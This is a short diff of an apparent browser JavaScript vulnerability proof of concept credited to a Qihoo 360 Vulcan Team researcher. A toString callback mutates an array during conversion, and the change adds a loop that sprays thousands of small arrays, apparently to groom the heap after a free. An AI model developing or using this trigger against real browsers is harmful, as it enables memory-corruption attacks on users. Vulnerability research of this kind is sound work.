@@ -1,5 +1,6 @@
 <script>////written by Wei of Qihoo 360 VulcanTeam
-var a;
+var a,c;
+c=new Array(0x10000);
 alert(1);
 function gc() {
     alert("in gc");
@@ -16,8 +17,11 @@ function gc() {
 }
 var a = [1,{toString:function(){
  a[2] = {};
- for(var i=0;i<0x1;i++){
- gc();
+ for(var i=0;i<c.length;i++){
+ c[i]=new Array(3);
+ c[i][0]=3;
+ c[i][1]=2;
+ c[i][2]=1;
  }
  return "aaa";
 }}, [1,2,3]]
